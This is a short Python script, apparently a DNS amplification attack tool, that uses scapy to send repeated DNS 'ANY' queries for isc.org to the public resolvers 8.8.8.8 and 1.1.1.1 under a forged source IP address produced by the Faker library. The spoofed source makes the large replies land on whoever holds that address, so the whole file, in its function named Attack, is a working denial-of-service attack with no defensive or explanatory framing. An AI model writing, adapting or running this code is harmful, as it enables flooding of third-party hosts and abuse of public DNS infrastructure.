from scapy.all import IP, UDP, send, DNS, DNSQR
from faker import Faker
import random

dnsServers = ["8.8.8.8", "1.1.1.1"]
fake = Faker()
dns_query = DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))

def Attack(requestPerServer):
    src_ip = fake.ipv4()
    for address in dnsServers:
        ip = IP(src=src_ip, dst=address)
        for i in range(requestPerServer):
            src_port = random.randint(1024, 65535)
            udp = UDP(sport=src_port, dport=53)
            packet = ip/udp/dns_query
            send(packet, verbose=False)
            print(f"{i} packets sent")
    pass
